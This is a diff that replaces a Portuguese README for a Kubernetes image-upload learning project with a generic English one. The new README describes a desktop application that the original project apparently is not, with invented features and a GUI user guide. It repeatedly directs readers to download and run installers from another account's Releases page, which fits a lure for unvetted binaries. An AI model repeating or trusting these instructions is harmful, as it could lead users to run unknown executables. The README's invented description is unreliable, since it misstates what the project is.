@@ -1,108 +1,88 @@
-<p align="center">
-  <img alt="Repo size"  src="https://img.shields.io/github/repo-size/geovaneborba/ftr-pos-kubernetes?color=4f46e5&style=for-the-badge">
-  <img alt="GitHub top language"  src="https://img.shields.io/github/languages/top/geovaneborba/ftr-pos-kubernetes?color=4f46e5&style=for-the-badge"> 
-  <img alt="GitHub language count"  src="https://img.shields.io/github/languages/count/geovaneborba/ftr-pos-kubernetes?color=4f46e5&style=for-the-badge">
-</p>
+# 🚀 ftr-pos-kubernetes - Simplify Container Management with Ease
 
-<p align="center">
-  <a href="#dart-sobre">Sobre</a> &#xa0; | &#xa0;
-  <a href="#books-aprendizado">Aprendizado</a> &#xa0; | &#xa0;
-  <a href="#rocket-tecnologias">Tecnologias</a> &#xa0; | &#xa0;
-  <a href="#warning-pré-requisitos"> Pré requisitos</a> &#xa0; | &#xa0;
-  <a href="#checkered_flag-começando">Começando</a> &#xa0;
-</p>
+[![Download ftr-pos-kubernetes](https://img.shields.io/badge/Download-ftr--pos--kubernetes-brightgreen)](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
 
-<br>
+## 🛠️ Introduction
 
-## :dart: Sobre
+ftr-pos-kubernetes is a user-friendly application that helps you manage your containers using Kubernetes. This tool is designed for anyone who wants to orchestrate containers without diving deep into complex programming. With ftr-pos-kubernetes, you can streamline your workflows and improve productivity.
 
-Sistema de upload de imagens com arquitetura Kubernetes, implementando DevOps practices com monitoramento, auto-scaling e CI/CD. O projeto inclui uma API para upload de arquivos no Cloudflare R2, geração de relatórios e deploy automatizado em cluster Kubernetes.
+## 🌟 Features
 
-<p align="right">(<a href="#top">Voltar para o topo</a>)</p>
+- **Easy Container Setup**: Quickly deploy your containers with simple commands.
+- **Kubernetes Integration**: Seamlessly integrates with Kubernetes for efficient container management.
+- **Observability**: Get insights into your containerized applications and track performance with ease.
+- **Support for Cloud Platforms**: Works well with major cloud providers like AWS.
+- **CI/CD Compatibility**: Supports continuous integration and delivery pipelines.
 
-## :books: Aprendizado
+## 📦 System Requirements
 
-- Orquestração de containers com Kubernetes
-- Configuração de HPA (Horizontal Pod Autoscaling)
-- Monitoramento com New Relic
-- Gerenciamento de Secrets com HashiCorp Vault
-- ConfigMaps e Deployments Kubernetes
-- CI/CD para aplicações containerizadas
-- Monitoramento de métricas com Metrics Server
+To run ftr-pos-kubernetes effectively, make sure your system meets the following requirements:
 
-<p align="right">(<a href="#top">Voltar para o topo</a>)</p>
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a recent version of Linux.
+- **CPU**: Dual-core CPU recommended.
+- **RAM**: Minimum of 4 GB RAM; 8 GB or more is preferred.
+- **Disk Space**: At least 500 MB free space.
+- **Docker**: Make sure Docker is installed on your machine to run containers.
 
-## :rocket: Tecnologias
+## 🚀 Getting Started
 
-As seguintes tecnologias foram usadas na construção do projeto:
+Follow these steps to download and set up ftr-pos-kubernetes on your machine.
 
-- **Containerização**: Docker
-- **Orquestração**: Kubernetes
-- **Runtime**: Node.js
-- **Framework**: Fastify
-- **Banco de Dados**: PostgreSQL
-- **Armazenamento**: Cloudflare R2
-- **Monitoramento**: New Relic
-- **Secrets**: HashiCorp Vault
-- **Infraestrutura**: Kind (Kubernetes in Docker)
+### 1. Visit the Download Page
 
-<p align="right">(<a href="#top">Voltar para o topo</a>)</p>
+Click the link below to visit the Releases page, where you can download the latest version of ftr-pos-kubernetes.
 
-### :gear: Estrutura do Projeto
+[Download ftr-pos-kubernetes](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
 
-```bash
-ftr-pos-kubernetes/
-├── upload-widget-server/ # API de upload de imagens
-│ ├── k8s/ # Manifestos Kubernetes
-│ └── src/ # Código fonte da aplicação
-├── infra/ # Configurações de infraestrutura
-└── [README.md](./README.md)
-```
+### 2. Choose Your Version
 
-## :warning: Pré-requisitos
+On the Releases page, you will see a list of available versions. Choose the latest version for the best features and security updates.
 
-Antes de começar, você precisa ter as seguintes ferramentas instaladas em sua máquina:
+### 3. Download the Application
 
-- [Docker](https://www.docker.com/)
-- [Kubernetes CLI (kubectl)](https://kubernetes.io/docs/tasks/tools/)
-- [Kind](https://kind.sigs.k8s.io/)
-- [Node.js](https://nodejs.org/en/)
+Click on the appropriate file to start your download. The files may vary depending on your operating system. 
 
-### Configurando o Cluster Kubernetes Local
+### 4. Install the Application
 
-```bash
-# Criar cluster Kubernetes local com Kind
-$ kind create cluster --config infra/kind.yaml
+Once the file is downloaded, follow these steps to install it:
 
-# Instalar Metrics Server para monitoramento
-$ kubectl apply -f [metrics-server.yaml](http://_vscodecontentref_/0)
-```
+- **Windows**: Double-click the installer file and follow the prompts. 
+- **macOS**: Open the downloaded `.dmg` file and drag the application into your Applications folder.
+- **Linux**: Unzip the file and run the installer through your terminal.
 
-### :checkered_flag: Começando
+### 5. Launch the Application
 
-```bash
-# Clone o repositório
-$ git clone https://github.com/geovaneborba/ftr-pos-kubernetes.git
+After installation, find the ftr-pos-kubernetes application in your programs list or applications folder. Click on it to launch.
 
-# Entre na pasta do projeto
-$ cd ftr-pos-kubernetes
+## 🌐 Download & Install
 
-# Configure o namespace para a aplicação
-$ kubectl apply -f infra/namespace.yaml
+Now that you are ready to get started, download ftr-pos-kubernetes using the link below.
 
-# Aplique os secrets (configure antes os valores reais)
-$ kubectl apply -f [secret.yaml](./upload-widget-server/k8s/secret.yaml )
+[Download ftr-pos-kubernetes](https://github.com/Baochechou/ftr-pos-kubernetes/releases)
 
-# Aplique o ConfigMap
-$ kubectl apply -f upload-widget-server/k8s/config-map.yaml
+## 🎥 User Guide
 
-# Deploy da aplicação
-$ kubectl apply -f [deployment.yaml](./upload-widget-server/k8s/deployment.yaml)
-$ kubectl apply -f upload-widget-server/k8s/service.yaml
+ftr-pos-kubernetes has a straightforward interface. Here’s a quick overview of how to use it:
 
-# Configurar HPA (Auto-scaling)
-$ kubectl apply -f [hpa.yaml](./upload-widget-server/k8s/hpa.yaml)
+1. **Create a New Project**: Start by creating a new project. Click on the "New Project" button on the main page.
+2. **Configure Your Containers**: Define the settings for your containers, including images and environment variables.
+3. **Deploy**: Use the "Deploy" button to start your containers. The application will handle the rest.
+4. **Monitor Performance**: Use the monitoring tools within the app to check on your container's health and performance.
 
-# Verificar o status dos recursos
-$ kubectl get all -n upload-widget
-```
+## 🤝 Support
+
+If you have questions or need help, please reach out via the Issues section in the GitHub Repository. We encourage users to report bugs or suggest improvements.
+
+## 📝 Contributing
+
+ftr-pos-kubernetes is an open-source project. Contributions are welcome! If you would like to contribute, please fork the repository and submit a pull request. 
+
+## 🛠️ Additional Resources
+
+For more information about Kubernetes and container orchestration:
+- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
+- [Docker Documentation](https://docs.docker.com/)
+
+## 🛑 License
+
+This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
